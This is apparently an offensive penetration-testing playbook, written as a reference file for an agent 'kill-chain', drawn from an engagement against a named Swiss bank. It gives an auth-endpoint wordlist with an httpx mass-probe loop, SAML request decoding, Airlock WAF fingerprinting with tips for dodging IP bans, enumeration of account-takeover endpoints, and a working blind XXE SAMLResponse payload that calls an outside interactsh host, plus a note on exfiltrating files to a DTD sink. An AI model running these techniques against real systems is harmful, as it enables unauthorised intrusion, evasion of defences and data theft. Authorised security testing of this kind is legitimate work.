# Auth-Surface Discovery, SAML Decode & Airlock Fingerprint (v2 additions)

Techniques added after the BCF (Banque Cantonale de Fribourg) engagement. These fill
gaps in the base kill-chain: a dedicated auth-surface sweep, SAML AuthnRequest decoding,
Ergon Airlock WAF fingerprinting, and SPA auth-flow endpoint enumeration.

## A. Auth-Surface Discovery (login / registration / admin)

Not covered as a distinct step before. Run after Phase 2 tech fingerprinting, before
Phase 4. Goal: enumerate every login, registration, onboarding and admin endpoint
across all live hosts — these are the highest-value attack surface for auth bugs.

Wordlist (`auth-paths.txt`) — one path per line (the loop below reads line-wise):
```
/login
/signin
/sign-in
/logon
/auth
/auth/login
/authenticate
/sso
/sso/login
/account/login
/user/login
/users/login
/users/sign_in
/session
/session/new
/oauth
/oauth/authorize
/oauth2/authorize
/oidc
/oidc/authorize
/realms/master
/realms/master/protocol/openid-connect/auth
/authorize
/login.html
/login.aspx
/login.php
/portal
/portal/login
/secure/login
/identity
/saml
/saml/login
/samlsso
/adfs/ls
/cas/login
/shibboleth
/register
/signup
/sign-up
/create-account
/account/register
/user/register
/users/new
/enrollment
/enrol
/enroll
/onboarding
/activate
/join
/admin
/admin/login
/admin/register
/administrator
/wp-admin
/wp-login.php
/manager
/manager/html
/console
/backoffice
/controlpanel
/dashboard
/staff
```

Generate host×path and probe fast with httpx:
```bash
while read h; do while read p; do echo "https://$h$p"; done < auth-paths.txt; done \
  < live_hosts.txt > auth_surface_urls.txt
httpx -l auth_surface_urls.txt -status-code -title -location -t 80 -o auth_surface_results.txt
```

Triage rules:
- **SPA/marketing catch-all** (every path → 200 with the same title) = NOT real
  endpoints. Don't chase.
- **Genuine hits** = distinct status/body: `403` admin, `302/303` to a login URL,
  `200` with a login form/SPA title.
- Record real login/register/admin endpoints (host, path, status, redirect target).

## B. SAML AuthnRequest/Response Decode (HTTP-Redirect binding)

When an SP 302-redirects to an IdP (`.../adfs/ls/?SAMLRequest=...&RelayState=...`),
decode the `SAMLRequest` to read SP metadata (ACS URL, Issuer, Destination, library).

Encoding = **URL-encode( base64( raw-DEFLATE(xml) ) )** (zlib `wbits=-15`).
Note: SAML Redirect binding uses STANDARD base64 (not base64url) — URL-encoding
is what makes it URL-safe.

```bash
# automated (script in pt_brahmastra/playbooks/saml_decode.py):
curl -sk "https://SP/login" -D - -o /dev/null | python3 saml_decode.py --from-location-header
# manual (URL-decode first, then base64, then raw-DEFLATE):
echo '<SAMLRequest>' | python3 -c "import sys,base64,zlib,urllib.parse;print(zlib.decompress(base64.b64decode(urllib.parse.unquote(sys.stdin.read().strip())),-15).decode())"
```

What to extract and report: `AssertionConsumerServiceURL` (often leaks an INTERNAL
hostname for reverse-proxied SPs), `Issuer` (SP entity ID), `Destination` (IdP),
`ID` prefix (`ONELOGIN_` = OneLogin php-saml), `ProviderName`. Then check whether the
disclosed hostnames are NXDOMAIN publicly (= split-horizon DNS → internal-only leak).

## C. Ergon Airlock WAF — fingerprint & block-vs-maintenance

Fingerprints:
- Cookies: `AL_SESS-S`, `AL_SESS` (session), `CSRFT<tenant>-S` (CSRF, e.g. `CSRFT759-S`).
- CSRF header injected by `/CSRFT<tenant>.js`: `X-CSRFT<tenant>`.
- Error pages: `/error_path/{400,404,503}.html?al_req_id=<id>` (Airlock request ID).
- Static assets under `/authen/images/airlock/`, `/authen/js/airlock/`.

Distinguish response classes (critical for not wasting time):
| Response | Meaning |
|---|---|
| `200` / `301` / `302` / `303` | normal / backend redirect |
| `303` → `/error_path/400.html?al_req_id=` | Airlock 400 (no backend route / blocked request) |
| `303` → `/error_path/503.html?al_req_id=` | Airlock 503 (backend down OR WAF block) |
| Branded `503` "Maintenance" HTML page | REAL app maintenance (backend returns it even via origin IP) |
| `403` on a host that was `200` earlier | **You got IP-banned by that app/WAF** — cool down |

IP-burn pattern: after a large sweep (~4–5k req), Airlock/fidentity start serving
maintenance/403 to your IP while still serving `200` to clean IPs. Confirm by hitting
an unrelated always-up host (e.g. `www.bcf.ch`) — if it's still `200`, the app-specific
block is real. Slow down (<1 rps), use a browser UA, honor 429/503, spread over time.

## D. SPA Auth-Flow Enumeration (React/Vue signin)

Modern SSO is often a SPA (React/Vue) over NetIQ/Keycloak/etc. Extract the auth API
from the JS bundle to map the login state machine:

1. `curl -sk <signin-page> | grep -oE 'src="[^"]+\.js"'` → download each bundle.
2. Grep for endpoint strings: `grep -oE '"/[a-zA-Z0-9_./-]+"' app.js | sort -u` and the
   `.concat(base, "/endpoint")` maps.
3. Poll the unauthenticated state endpoint (`/state`, `/start`, `/authn/signin/state`)
   to dump the flow config (`view`, `progressPercent`, `expressAuthEnabled`, self-service flags).
4. Look for step-skip endpoints: `promote`/`demote` (NetIQ AM migration), `express-auth`,
   `resend-*` (MFA), `*-self-unblock-init` (self-service reset = account-takeover surface).

## E. SAMLResponse OOB XXE — callback-only (no DTD hosting)

When a SAML SP consumes a `SAMLResponse` (e.g. `.../callback?client_name=Saml2Client`)
and you only need to CONFIRM blind XXE (not read a file), skip the two-stage
hosted-DTD dance entirely. Reference your interactsh URL directly as an external
entity and use it in the document body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "https://<token>.oast.live">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
  ...
  &xxe;
</samlp:Response>
```

POST the whole thing base64-encoded as `SAMLResponse=<b64>` (form-urlencoded) to the
callback. The `&xxe;` in the body forces the parser to resolve the external entity,
firing the HTTP request to your collaborator. No paste.rs, no attacker-hosted DTD.

Pitfalls:
- If the parser only resolves entities inside DTD declarations (not the document
  body), the direct reference won't fire; fall back to the two-stage hosted-DTD
  version (stage-2 DTD exfiltrates `?d=%file;` to the sink).
- Blind XXE often returns `303 -> /error` with an empty body; the ONLY signal is
  the OOB callback, so watch the collaborator dashboard, not the HTTP response.
- `-k` is required when the target TLS cert is expired.
- File-read exfil content must be single-line/URI-safe or the callback breaks.

## Reference files to update

Add these to the base SKILL.md table:
| File | Load when |
|---|---|
| `references/auth-surface-saml-waf.md` (this file) | Phases 2–4 auth targets, SAML SPs, Airlock-protected targets |
